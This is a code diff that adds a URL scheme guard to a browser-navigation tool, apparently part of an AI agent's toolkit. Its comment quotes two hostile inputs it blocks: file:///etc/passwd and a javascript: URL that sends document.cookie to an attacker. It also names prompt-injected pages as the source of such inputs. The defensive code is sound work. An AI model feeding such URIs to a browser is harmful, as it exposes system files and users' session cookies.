@@ -52,6 +52,28 @@ export const browserNavigate: ToolDefinition = {
     },
     async handler(input) {
         try {
+            // URL scheme guard — reject file://, javascript:, data:, and any
+            // other non-HTTP(S) URI. A prompt-injected page or a misbehaving
+            // agent could otherwise hand us file:///etc/passwd (local read)
+            // or javascript:fetch(attacker+document.cookie) (XSS in the live
+            // browser context). We accept only http:// and https://.
+            const urlRaw = String(input.url ?? "").trim();
+            if (!urlRaw) {
+                return JSON.stringify({ error: "url is required" });
+            }
+            let scheme: string;
+            try {
+                scheme = new URL(urlRaw).protocol.toLowerCase();
+            } catch {
+                return JSON.stringify({ error: `invalid url: ${urlRaw.slice(0, 120)}` });
+            }
+            if (scheme !== "http:" && scheme !== "https:") {
+                return JSON.stringify({
+                    error: `unsafe URL scheme "${scheme}" — only http(s) is allowed`,
+                    url: urlRaw.slice(0, 120),
+                });
+            }
+
             const context = await getBrowser();
             let page;
             if (input.new_tab) {
@@ -63,7 +85,7 @@ export const browserNavigate: ToolDefinition = {
             }
             const timeout = (input.timeout_ms as number) || 30000;
             // Show HUD while navigating
-            const navDomain = (input.url as string).replace(/^https?:\/\/(www\.)?/, '').split('/')[0];
+            const navDomain = urlRaw.replace(/^https?:\/\/(www\.)?/, '').split('/')[0];
             await page.evaluate(`(${ATLAS_HUD_JS})(${JSON.stringify({ label: `🌐 Navigating to ${navDomain}`, done: false })})`).catch(() => {});
             // Catch navigation timeouts — page is likely usable even if not fully loaded
             await page.goto(input.url as string, { waitUntil: "domcontentloaded", timeout }).catch(() => null);
